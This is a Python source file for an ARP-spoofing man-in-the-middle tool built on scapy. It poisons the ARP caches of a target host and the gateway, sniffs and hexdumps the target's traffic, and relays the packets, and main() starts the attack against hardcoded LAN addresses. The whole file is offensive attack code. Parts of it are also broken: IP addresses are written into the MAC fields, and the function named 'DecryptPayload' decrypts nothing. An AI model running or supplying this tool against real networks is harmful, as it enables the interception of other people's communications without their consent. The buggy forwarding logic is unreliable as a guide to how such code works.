import scapy.all as scapy
from scapy.utils import hexdump
import threading
import base64

class MITMAttack:
    """A class which contains all the required functions to perform a man-in-the-middle attack."""

    def __init__(self, defaultGatewayIP, targetIP) -> None:
        self.defaultGatewayIP = defaultGatewayIP
        self.targetIP = targetIP
        self.localhostMac = None
        self.isActive = False

        # Adding threads
        self.mutexLock = threading.Lock()
        self.ArpSpoofingThread = None
        self.sniffingPacketsThread = None


    def packetToDict(self, packet):
        # The function gets a packet and returns its details as a dictionary.
        if packet is None:
            return None
        packetDict = {}
        for layer in packet.layers():
            layerName = layer.__name__
            layerFields = {}
            for fieldName, fieldValue in packet[layer].fields.items():
                # Check if the field value is bytes and decode it for readability
                if isinstance(fieldValue, bytes):
                    fieldValue = fieldValue.decode(errors='ignore')
                layerFields[fieldName] = fieldValue
            packetDict[layerName] = layerFields
        return packetDict
    

    def findTargetMacAddr(self, ip):
        # The function gets a host's IP and returns its MAC address.

        # The destination MAC is the broadcast MAC address.
        arpSpoofingPacket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
        # When verbose parameter equals 0, the function won't print all the log prints.
        reply, _ = scapy.srp(arpSpoofingPacket, timeout=3, verbose=0)
        if not reply:
            return None
        return reply[0][1].src
    

    def DecryptPayload(self, encrypted_payload):
        # Function to decrypt the payload (assuming it's a base64 encoded string)
        try:
            print("Decrypted Payload:")
            raw = encrypted_payload
            return hexdump(raw)
        except Exception as e:
            print(f"Error decrypting payload: {e}")
            return encrypted_payload
        
    def printPacket(self, packet):
        # The function gets any packet and prints its details including MAC, IP addresses, and decrypted payload.
        if packet is None:
            print("No packet to print")
            return
        
        etherLayer = packet.getlayer(scapy.Ether)
        ipLayer = packet.getlayer(scapy.IP)

        if etherLayer and ipLayer:
            print("== Packet ==")
            print(f"Source MAC: {etherLayer.src}, Source IP: {ipLayer.src}")
            print(f"Destination MAC: {etherLayer.dst}, Destination IP: {ipLayer.dst}")

            # Print decrypted payload if present
            payload = packet.payload
            if payload:
                self.DecryptPayload(payload)
        print("======================================================================")


    def PacketForwardingHelper(self, packet):
        # The function gets a packet and forwards it from the target to the default gateway or vice versa.
        try:
            if packet is None:
                return
            with self.mutexLock:
                if scapy.IP in packet:
                    self.printPacket(packet)
                    if packet[scapy.IP].src == self.targetIP and packet[scapy.IP].dst != self.defaultGatewayIP:
                        packet[scapy.Ether].src = self.localhostMac
                        packet[scapy.Ether].dst = self.defaultGatewayIP
                        scapy.send(packet, verbose=0)
                    elif packet[scapy.IP].src == self.defaultGatewayIP and packet[scapy.IP].dst == self.targetIP:
                        packet[scapy.Ether].src = self.localhostMac
                        packet[scapy.Ether].dst = self.targetIP
                        scapy.send(packet, verbose=0)
        except Exception as e:
            pass


    def packetForwarding(self):
        # The function continuously sniffs the packets and calls the helper function to perform the forwarding.
        scapy.sniff(filter=f"ip host {self.targetIP}", prn=self.PacketForwardingHelper, store=False)


    def arpSpoofing(self):
        # The function sends ARP packets with this host's MAC address.
        with self.mutexLock:
            # When the op parameter is "is-at", the packet is considered a response
            arpResponsePacketToDefaultGateway = scapy.ARP(
                psrc=self.targetIP, pdst=self.defaultGatewayIP, hwdst=self.localhostMac, op="is-at"
            )
            arpResponsePacketToTarget = scapy.ARP(
                psrc=self.defaultGatewayIP, pdst=self.targetIP, hwdst=self.localhostMac, op="is-at"
            )
        while self.isActive:
            scapy.send(arpResponsePacketToDefaultGateway, verbose=0)
            scapy.send(arpResponsePacketToTarget, verbose=0)


    def startAttack(self):
        # The function starts the man-in-the-middle attack.
        while not self.localhostMac:
            self.localhostMac = self.findTargetMacAddr(ip=scapy.get_if_addr(scapy.conf.iface))

        self.isActive = True
        print("The MITM attack started!")

        self.ArpSpoofingThread = threading.Thread(target=self.arpSpoofing)
        self.sniffingPacketsThread = threading.Thread(target=self.packetForwarding)

        # Starting the threads
        self.ArpSpoofingThread.start()
        self.sniffingPacketsThread.start()


    def stopAttack(self):
        # The function stops the man-in-the-middle attack.
        self.isActive = False
        if self.sniffingPacketsThread is not None:
            self.sniffingPacketsThread.join()
        if self.ArpSpoofingThread is not None:
            self.ArpSpoofingThread.join()
        print("The MITM attack stopped!")


def main():
    mitmAttack = MITMAttack(defaultGatewayIP="192.168.0.1", targetIP="192.168.1.119")
    # Start the attack
    mitmAttack.startAttack()

if __name__ == "__main__":
    main()
